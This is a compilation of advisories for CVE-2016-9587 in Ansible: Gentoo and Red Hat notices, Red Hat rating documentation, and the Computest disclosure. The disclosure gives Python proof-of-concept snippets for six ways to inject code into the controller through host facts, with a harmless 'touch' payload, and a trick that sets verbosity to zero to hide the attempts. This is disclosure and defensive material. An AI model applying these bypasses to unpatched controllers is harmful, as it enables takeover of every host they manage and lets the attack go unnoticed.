### Description

An input validation vulnerability was found in Ansible’s handling of
data sent from client systems.

### Impact

An attacker with control over a client system being managed by Ansible
and the ability to send facts back to the Ansible server could execute
arbitrary code on the Ansible server using the Ansible-server privileges.

### Workaround

There is no known workaround at this time.

### Resolution

All Ansible 2.1.x users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-admin/ansible-2.1.4.0_rc3"

```

All Ansible 2.2.x users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=app-admin/ansible-2.2.1.0_rc5"

```

###########  Computest security advisory CT-2017-0109 #############

            Summary: Command execution on Ansible controller from host
  Affected software: Ansible
	        CVE: CVE-2016-9587
      Reference URL: https://www.computest.nl/advisories/
                     CT-2017-0109_Ansible.txt
  Affected versions: < 2.1.4, < 2.2.1

             Credit: Undisclosed at Computest (research@computest.nl)
Date of publication: January 9, 2017

During a summary code review of Ansible, Computest found and exploited several
issues that allow a compromised host to execute commands on the Ansible
controller and thus gain access to the other hosts controlled by that
controller.

This was not a full audit and further issues may or may not be present.

About Ansible
-------------
"Ansible is an open-source automation engine that automates cloud provisioning,
configuration management, and application deployment. Once installed on a
control node, Ansible, which is an agentless architecture, connects to a managed
node through the default OpenSSH connection type."
							- wikipedia.org

Technical Background
--------------------
A big threat to a configuration management system like Ansible, Puppet, Salt
Stack and others, is compromise of the central node. In Ansible terms this is
called the Controller. If the Controller is compromised, an attacker has
unfettered access to all hosts that are controlled by the Controller. As such,
in any deployment, the central node receives extra attention in terms of
security measures and isolation, and threats to this node are taken even more
seriously.

Fortunately for team blue, in the case of Ansible the attack surface of the
Controller is pretty small. Since Ansible is agent-less and based on push, the
Controller does not expose any services to hosts.

A very interesting bit of attack surface though is in the Facts. When Ansible
runs on a host, a JSON object with Facts is returned to the Controller. The
Controller uses these facts for various housekeeping purposes. Some facts have
special meaning, like the fact "ansible_python_interpreter" and
"ansible_connection". The former defines the command to be run when Ansible is
looking for the python interpreter, and the second determines the host Ansible
is running against. If an attacker is able to control the first fact he can
execute an arbitrary command, and if he is able to control the second fact he is
able to execute on an arbitrary (Ansible-controlled) host. This can be set to
"local" to execute on the Controller itself.

Because of this scenario, Ansible filters out certain facts when reading the
facts that a host returns. However, we have found 6 ways to bypass this filter.

In the scenarios below, we will use the following variables:

PAYLOAD = "touch /tmp/foobarbaz"

# Define some ways to execute our payload.
LOOKUP = "lookup('pipe', '%s')" % PAYLOAD
INTERPRETER_FACTS = {
	# Note that it echoes an empty dictionary {} (it's not a format string).
	'ansible_python_interpreter': '%s; cat > /dev/null; echo {}' % PAYLOAD,
	'ansible_connection': 'local',
	# Become is usually enabled on the remote host, but on the Ansible
	# controller it's likely password protected. Disable it to prevent
	# password prompts.
	'ansible_become': False,
}

Bypass #1: Adding a host
------------------------
Ansible allows modules to add hosts or update the inventory. This can be very
useful, for instance when the inventory needs to be retrieved from a IaaS
platform like as the AWS module does.

If we're lucky, we can guess the inventory_hostname, in which case the host_vars
are overwritten [2] and they will be in effect at the next task. If host_name
doesn't match inventory_hostname, it might get executed in the play for the next
hostgroup, also depending on the limits set on the commandline.

# (Note that when data["add_host"] is set,
# data["ansible_facts"] is ignored.)
data['add_host'] = {
    # assume that host_name is the same as inventory_hostname
    'host_name': socket.gethostname(),
    'host_vars': INTERPRETER_FACTS,
}

# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/strategy/__init__.py#L580

Bypass #2: Conditionals
-----------------------
Ansible actions allow for conditionals. If we know the exact contents of a
"when" clause, and we register it as a fact, a special case checks whether the
"when" clause matches a variable [1]. In that case it replaces it with its
contents and evaluates [2] them.

# Known conditionals, separated by newlines
known_conditionals_str = """
ansible_os_family == 'Debian'
ansible_os_family == "Debian"
ansible_os_family == 'RedHat'
ansible_os_family == "RedHat"
ansible_distribution == "CentOS"
result|failed
item > 5
foo is defined
"""
known_conditionals = [x.strip() for x in known_conditionals_str.split('\n')]
for known_conditional in known_conditionals:
    data['ansible_facts'][known_conditional] = LOOKUP

[1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/playbook/conditional.py#L118
[2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/playbook/conditional.py#L125

Bypass #3: Template injection in stat module
--------------------------------------------
The template module/action merges its results with those of the stat module.
This allows us to bypass [1][2][3] the stripping of magic variables from
ansible_facts [4], because they're at an unexpected location in the result tree.

data.update({
    'stat': {
        'exists': True,
        'isdir': False,
        'checksum': {
            'rc': 0,
            'ansible_facts': INTERPRETER_FACTS,
        },
    }
})

# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/template.py#L39
# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/template.py#L49
# [3] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/template.py#L146
# [4] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/action/__init__.py#L678

Bypass #4: Template injection by changing jinja syntax
------------------------------------------------------
Remote facts always get quoted. Set_fact unquotes them by evaluating them.
UnsafeProxy was designed to defend against unquoting by transforming jinja
syntax into jinja comments, effectively disabling injection.

Bypass the filtering of "{{" and "{%" by changing the jinja syntax [1][2]. The
{{}} is needed to make it look like a variable [3].  This works against:
- set_fact: foo="{{ansible_os_family}}"
- command: echo "{{foo}}

data['ansible_facts'].update({
    'exploit_set_fact': True,
    'ansible_os_family': "#jinja2:variable_start_string:'[[',variable_end_string:']]',block_start_string:'[%',block_end_string:'%]'\n{{}}\n[[ansible_host]][[lookup('pipe', '" + PAYLOAD  + "')]]",
})

# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L66
# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L469
# [3] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L308

Bypass #5: Template injection in dict keys
------------------------------------------
Strings and lists are properly cleaned up, but dictionary keys are not [1]. This
works against:
- set_fact: foo="some prefix {{ansible_os_family}} and/or suffix"
- command: echo "{{foo}}

The prefix and/or suffix are needed in order to turn the
dict into a string, otherwise the value would remain a dict.

data['ansible_facts'].update({
    'exploit_set_fact': True,
    'ansible_os_family': { "{{ %s }}" % LOOKUP: ''},
})

# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/vars/unsafe_proxy.py#L104

Bypass #6: Template injection using safe_eval
---------------------------------------------
There's a special case for evaluating strings that look like a list or dict [1].
Strings that begin with "{" or "[" are evaluated by safe_eval [2]. This allows
us to bypass the removal of jinja syntax [3]: we use the whitelisted Python to
re-create a bit of Jinja template that is interpreted.

This works against:
- set_fact: foo="{{ansible_os_family}}"
- command: echo "{{foo}}

data['ansible_facts'].update({
    'exploit_set_fact': True,
    'ansible_os_family': """[ '{'*2 + "%s" + '}'*2 ]""" % LOOKUP,
})

# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L334
# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/safe_eval.py
# [3] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/template/__init__.py#L229

Issue: Disabling verbosity
--------------------------
Verbosity can be set on the controller to get more debugging information. This
verbosity is controlled through a custom fact. A host however can overwrite this
fact and set the verbosity level to 0, hiding exploitation attempts.

data['_ansible_verbose_override'] = 0

# [1] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/callback/default.py#L99
# [2] https://github.com/ansible/ansible/blob/a236cbf3b42fa2c51b89e9395b47abe286775829/lib/ansible/plugins/callback/default.py#L208

Issue: Overwriting files
------------------------
Roles usually contain custom facts that are defined in defaults/main.yml,
intending to be overwritten by the inventory (with group and host vars). These
facts can be overwritten by the remote host, due to the variable precedence [1].
Some of these facts may be used to specify the location of a file that will be
copied to the remote host. The attacker may change it to /etc/passwd. The
opposite is also true, he may be able to overwrite files on the Controller. One
example is the usage of a password lookup with where the filename contains a
variable [2].

[2] http://docs.ansible.com/ansible/playbooks_lookups.html#the-password-lookup

Mitigation
----------
Computest is not aware of mitigations short of installing fixed versions of the
software.

Resolution
----------
Ansible has released new versions that fix the vulnerabilities described in
this advisory: version 2.1.4 for the 2.1 branch and 2.2.1 for the 2.2 branch.

Conclusion
----------
The handling of Facts in Ansible suffers from too many special cases that allow
for the bypassing of filtering. We found these issues in just hours of code
review, which can be interpreted as a sign of very poor security. However, we
don't believe this is the case.

The attack surface of the Controller is very small, as it consists mainly of the
Facts. We believe that it is very well possible to solve the filtering and
quoting of Facts in a sound way, and that when this has been done, the
opportunity for attack in this threat model is very small.

Furthermore, the Ansible security team has been understanding and professional
in their communication around this issue, which is a good sign for the handling
of future issues.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A1685)

## Topic

An update for ansible is now available for RHEV Engine version 4.1.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Ansible is a simple model-driven configuration management, multi-node deployment, and remote-task execution system. Ansible works over SSH and does not require any software or daemons to be installed on remote nodes. Extension modules can be written in any language and are transferred to managed machines automatically.

The following packages have been upgraded to a later upstream version: ansible (2.3.0.0). (BZ#1446527)

Security Fix(es):

* An input validation vulnerability was found in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible server privileges. (CVE-2016-9587)
* An input validation vulnerability was found in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible, and the ability to send facts back to the Ansible server, could use this flaw to execute arbitrary code on the Ansible server using the Ansible server privileges. (CVE-2017-7466)
* An input validation vulnerability was found in Ansible's mysql\_user module which may fail to correctly change a password in certain circumstances. Thus the previous password would still be active when it should have been changed. (CVE-2016-8647)

The CVE-2017-7466 issue was discovered by Evgeni Golov (Red Hat).

| [Description](show_bug.cgi?id=1414276#c0)  Simon Reber    2017-01-18 08:56:19 UTC  ``` Description of problem:  When running the installer but defining `ansible_user` with a different username to use, that has Windows format, such as `dom\user` the installer is failing as `ansible` can not properly escape the `\`.  Escaping `{{ansible_user}}` like the below example fixes the issue:  > command: "/usr/bin/id -g \"{{ ansible_ssh_user }}\""  Version-Release number of selected component (if applicable):  openshift-ansible-3.2.36-1.git.0.164eb4c.el7.noarch atomic-openshift-3.2.1.17-1.git.0.6d01b60.el7.x86_64  How reproducible:  Always  Steps to Reproduce: 1. Create user `dom\user` on the client systems 2. Set `ansible_user` to 'dom\user' 3. Run installer like described in <https://docs.openshift.com/enterprise/3.2/install_config/install/advanced_install.html#multiple-masters>  Actual results:  Installer is failing as because the task below in /usr/share/ansible/openshift-ansible/roles/openshift_master_certificates/tasks/main.yml is failing      132 - name: Lookup default group for ansible_ssh_user     133   command: "/usr/bin/id -g {{ ansible_ssh_user }}"     134   changed_when: false     135   register: _ansible_ssh_user_gid  Expected results:  Installer should work in any case and with any kind of user defined that is valid and working with ssh  Additional info:  Created <https://github.com/ansible/ansible/issues/20381> to see if this is something that can be fixed in `ansible`   ```  [Comment 5](show_bug.cgi?id=1414276#c5)  Scott Dodson    2017-02-22 18:42:44 UTC  ``` <https://github.com/openshift/openshift-ansible/pull/3457> Proposed fix   ```  [Comment 11](show_bug.cgi?id=1414276#c11)  Scott Dodson    2017-02-24 16:13:17 UTC  ``` <https://github.com/openshift/openshift-ansible/pull/3485> backport to 3.3   ```  [Comment 13](show_bug.cgi?id=1414276#c13)  Wenkai Shi    2017-02-28 11:41:56 UTC  ``` Verified with version openshift-ansible-3.3.67-1.git.0.7c5da0c.el7, installation succeed with ansible user 'dom\user'.  # cat hosts [OSEv3:children] masters nodes nfs  [OSEv3:vars] ansible_ssh_user='dom\user' ansible_become=yes debug_level=5 deployment_type=openshift-enterprise openshift_release=v3.3  oreg_url=... openshift_docker_additional_registries=... openshift_docker_insecure_registries=... openshift_examples_modify_imagestreams=true osm_use_cockpit=false osm_cockpit_plugins="['cockpit-kubernetes']"  openshift_additional_repos=[{'id': 'ose-devel', 'name': 'ose-devel', 'baseurl': '...', 'enabled': 1, 'gpgcheck': 0}]  openshift_master_identity_providers=[{'name': 'htpasswd_auth', 'login': 'true', 'challenge': 'true', 'kind': 'HTPasswdPasswordIdentityProvider', 'filename': '/etc/origin/master/htpasswd'}] openshift_master_htpasswd_users={'weshi': '$apr1$64.bNFRx$hasOByTx4S9hcMUy0qlsm1', 'wkshi': '$apr1$2PsVtrnA$DrtSyupkggQhqL1OWmYhs0'}  openshift_hosted_router_selector="role=node,router=enabled" openshift_hosted_registry_selector="role=node,registry=enabled"  openshift_hosted_registry_storage_kind=nfs openshift_hosted_registry_storage_access_modes=['ReadWriteMany'] openshift_hosted_registry_storage_nfs_directory=/exports openshift_hosted_registry_storage_nfs_options='*(rw,root_squash,sync)' openshift_hosted_registry_storage_volume_name=registry openshift_hosted_registry_storage_volume_size=10Gi  openshift_set_hostname=true openshift_override_hostname_check=true  [masters] openshift.example.com openshift_hostname="openshift.example.com" openshift_public_hostname="openshift.example.com"  [nodes] openshift.example.com openshift_hostname="openshift.example.com" openshift_public_hostname="openshift.example.com" openshift_node_labels="{'role': 'node', 'registry': 'enabled', 'router': 'enabled'}" openshift_schedulable=True  [nfs] openshift.example.com   ```  [Comment 15](show_bug.cgi?id=1414276#c15)  errata-xmlrpc    2017-03-06 16:37:36 UTC  ``` Since the problem described in this bug report should be resolved in a recent advisory, it has been closed with a resolution of ERRATA.

# RHSA-2017:0448 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: ansible and openshift-ansible security and bug fix update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A0448)

## Topic

An update for ansible and openshift-ansible is now available for Red Hat OpenShift Container Platform 3.2, Red Hat OpenShift Container Platform 3.3, and Red Hat OpenShift Container Platform 3.4.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Red Hat OpenShift Container Platform is the company's cloud computing Platform-as-a-Service (PaaS) solution designed for on-premise or private cloud deployments.

Ansible is a SSH-based configuration management, deployment, and task execution system. The openshift-ansible packages contain Ansible code and playbooks for installing and upgrading OpenShift Container Platform 3.

Security Fix(es):

* An input validation vulnerability was found in Ansible's handling of data sent from client systems. An attacker with control over a client system being managed by Ansible and the ability to send facts back to the Ansible server could use this flaw to execute arbitrary code on the Ansible server using the Ansible server privileges. (CVE-2016-9587)

Bug Fix(es):

Space precludes documenting all of the non-security bug fixes in this advisory. See the relevant OpenShift Container Platform Release Notes linked to in the References section, which will be updated shortly for this release.

## Solution

Before applying this update, make sure all previously released errata relevant to your system have been applied.

To apply this update, run the following on all hosts where you intend to initiate Ansible-based installation or upgrade procedures:

# yum update atomic-openshift-utils

This update is available via the Red Hat Network. Details on how to use the Red Hat Network to apply this update are available at:

<https://access.redhat.com/articles/11258>

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## Environment considerations

Red Hat Enterprise Linux starting with versions 6.1 and 5.7 introduced a new Red Hat Subscription Management (RHSM) service. Red Hat Network (RHN) has been decommissioned.

Users that are new to Red Hat or would like the enhanced subscription information and improved content access should use RHSM. If you are still using Red Hat Network, we advise you to [migrate to RHSM as soon as possible](https://access.redhat.com/products/red-hat-subscription-management#migration). Customers using older versions of Red Hat Enterprise Linux must continue using RHN Classic. Refer to [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](https://access.redhat.com/articles/47844) and [What's the difference between management services provided by Red Hat Network (RHN) Classic and Red Hat Subscription Management (RHSM)?](https://access.redhat.com/articles/63269) for more information on benefits of RHSM over RHN.

* For **Red Hat Enterprise Linux 9**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 9](#rhel9).
* For **Red Hat Enterprise Linux 8**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 8](#rhel8).
* For **Red Hat Enterprise Linux 7**, register the system using RHSM as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 7](#rhel7).
* For **Red Hat Enterprise Linux 6**, register the system using RHSM (if RHEL 6.1 or above) as described in [Registering the system with the Subscription Manager](#rhsm). Then update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 6](#rhel6).
* For **Red Hat Enterprise Linux 5**, register the system using RHSM (if RHEL 5.7 or above) as described in [Registering the system with the Subscription Manager](#rhsm). After registration, update the system according to instructions in [Applying package updates on Red Hat Enterprise Linux 5](#rhel5).
* If your system cannot connect to the Internet directly, our [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/) offering may be of interest.

## Prerequisites

### Registering the system with the Subscription Manager

#### Graphical interface

Access the Subscription Management GUI client in Red Hat Enterprise Linux 9 via **Activities** and then **Show Applications** which is visible in the Favorites dock by default.

Access the Subscription Management GUI client in Red Hat Enterprise Linux 8 via **Activities**, then select **Show Applications** and click **All**. Then select **Red Hat Subscription Manager**.

In Red Hat Enterprise Linux 7 open **Applications** -> **System Tools** -> **Red Hat Subscription Manager** and in Red Hat Enterprise Linux 6 via **System** -> **Administration** -> **Red Hat Subscription Manager**.

#### Command line

A system can also be registered via the command line by using the "subscription-manager" command. To register your system, either through the GUI or from the command line, follow the instructions in the [Using and Configuring Red Hat Subscription Manager](https://access.redhat.com/documentation/en-US/Red_Hat_Subscription_Management/1/html-single/RHSM/index.html) guide.

Make sure that your firewall allows configuring RHSM, for more information see [How do I access RHSM (yum) through a firewall?](https://access.redhat.com/solutions/65300).

General information on RHSM can be found in [Red Hat Network Subscription Management](https://access.redhat.com/documentation/en-US/Red_Hat_Customer_Portal/1/html/Red_Hat_Network_Certificate-based_Subscription_Management/index.html), while [FAQ for Changes to Red Hat's Entitlement Platform with RHEL 6.1 and 5.7](/knowledge/node/47844) provides a quick overview and a comparison with RHN.
